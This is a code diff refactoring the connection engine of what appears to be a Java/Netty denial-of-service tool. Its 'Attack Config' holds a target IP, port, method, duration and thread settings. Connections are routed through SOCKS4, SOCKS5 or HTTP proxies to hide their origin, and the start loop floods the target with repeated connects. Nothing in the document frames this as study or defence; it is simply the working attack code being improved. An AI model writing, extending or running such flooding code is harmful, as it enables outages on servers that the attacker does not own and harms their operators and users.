@@ -25,16 +25,16 @@ import io.netty.util.ResourceLeakDetector;
 public class NettyBootstrap {
 
     // Attack Config
-    public String srvIp;
-    public int port;
-    private IMethod method;
-    private int duration;
-    private int perDelay;
-    private int delay;
-    private int loopThreads;
-    private int workerThreads;
-    public int proxyType = 0;
-    public int protocolID;
+    public final String srvIp;
+    public final int port;
+    private final IMethod method;
+    private final int duration;
+    private final int perDelay;
+    private final int delay;
+    private final int loopThreads;
+    private final int workerThreads;
+    public final int proxyType = 0;
+    public final int protocolID;
     public static Class<? extends Channel> socketChannel;
 
     // IDK WHAT TO TYPE HERE
@@ -182,17 +182,8 @@ public class NettyBootstrap {
         this.protocolID = attackConfig.getProtocolID();
         this.method.init(this);
 
-        if (System.getProperty("os.name").toLowerCase().contains("win")) {
-            socketChannel = NioSocketChannel.class;
-            loopGroup = new NioEventLoopGroup(workerThreads, new ThreadFactory() {
-                public Thread newThread(Runnable r) {
-                    Thread t = new Thread(r);
-                    t.setDaemon(true);
-                    t.setPriority(10);
-                    return t;
-                }
-            });
-        } else {
+        if (attackConfig.isUsingEpoll()) {
+
             socketChannel = EpollSocketChannel.class;
             loopGroup = new EpollEventLoopGroup(workerThreads, new ThreadFactory() {
                 public Thread newThread(Runnable r) {
@@ -202,27 +193,38 @@ public class NettyBootstrap {
                     return t;
                 }
             });
+
+        } else {
+            socketChannel = NioSocketChannel.class;
+            loopGroup = new NioEventLoopGroup(workerThreads, new ThreadFactory() {
+                public Thread newThread(Runnable r) {
+                    Thread t = new Thread(r);
+                    t.setDaemon(true);
+                    t.setPriority(10);
+                    return t;
+                }
+            });
         }
 
         switch (proxyType) {
-            case 0 :
+            case 0:
                 BOOTSTRAP = (new Bootstrap()).channel(socketChannel).group(loopGroup)
                         .option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE)
                         .handler(SOCKS4);
-                            break;
-            case 1 : 
+                break;
+            case 1:
                 BOOTSTRAP = (new Bootstrap()).channel(socketChannel).group(loopGroup)
                         .option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE)
                         .handler(SOCKS5);
-                            break;
+                break;
             case 2:
                 BOOTSTRAP = (new Bootstrap()).channel(socketChannel).group(loopGroup)
                         .option(ChannelOption.TCP_NODELAY, Boolean.TRUE).option(ChannelOption.AUTO_READ, Boolean.TRUE)
                         .handler(HTTP);
-                            break;
-            default :
-                System.out.println("BRO WTF");
-        }   
+                break;
+            default:
+                System.out.println("BRO WTF USE PROXY\nInfo: 0 -> Socks4Proxy, 1 -> Socks5Proxy, 2 -> HttpProxy");
+        }
     }
 
     public void start() {
@@ -259,7 +261,7 @@ public class NettyBootstrap {
                     for (int j = 0; j < perDelay; j++) {
                         BOOTSTRAP.connect(addr);
                     }
-                    
+
                     try {
                         Thread.sleep(delay);
                     } catch (InterruptedException e) {
